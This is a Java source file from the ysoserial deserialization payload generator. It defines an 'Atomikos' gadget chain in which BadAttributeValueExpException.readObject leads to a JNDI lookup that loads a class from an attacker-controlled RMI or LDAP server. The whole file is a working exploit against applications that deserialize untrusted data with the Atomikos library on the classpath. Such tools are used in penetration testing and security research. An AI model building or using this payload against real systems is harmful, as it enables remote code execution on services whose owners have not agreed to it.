package ysoserial.payloads;

import javax.management.BadAttributeValueExpException;

import com.atomikos.icatch.jta.RemoteClientUserTransaction;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/**
*
* Gadget chain:
* 
* 	javax/management/BadAttributeValueExpException.readObject()
*  		com/atomikos/icatch/jta/RemoteClientUserTransaction.toString()
*  		com/atomikos/icatch/jta/RemoteClientUserTransaction.checkSetup()
*  			javax/naming/InitialContext.lookup()
*
*
* Arguments:
* - (rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>
*
*
* @author sciccone
*
*/
@Dependencies( { "com.atomikos:transactions-osgi:4.0.6" } )
@Authors({ Authors.SCICCONE })
public class Atomikos implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		
		// validate command
        int sep = command.lastIndexOf('/');
        if ( sep < 0 ) 
			throw new IllegalArgumentException("Command format is: "
					+ "(rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>");

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);
		
		// create factory based on url
		String initialContextFactory;
		if (url.startsWith("ldap"))
			initialContextFactory = "com.sun.jndi.ldap.LdapCtxFactory";
		else if (url.startsWith("rmi"))
			initialContextFactory = "com.sun.jndi.rmi.registry.RegistryContextFactory";
		else 
			throw new IllegalArgumentException("Command format is: "
					+ "(rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>");
		
		// create object
		RemoteClientUserTransaction rcut = new RemoteClientUserTransaction();
		
		// set values using reflection
		Reflections.setFieldValue(rcut, "initialContextFactory", initialContextFactory);
		Reflections.setFieldValue(rcut, "providerUrl", url);
		Reflections.setFieldValue(rcut, "userTransactionServerLookupName", className);
		
		// create exception
		BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
		Reflections.setFieldValue(exception, "val", rcut);
		
		return exception;
	}

	
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Atomikos.class, args);
    }
}
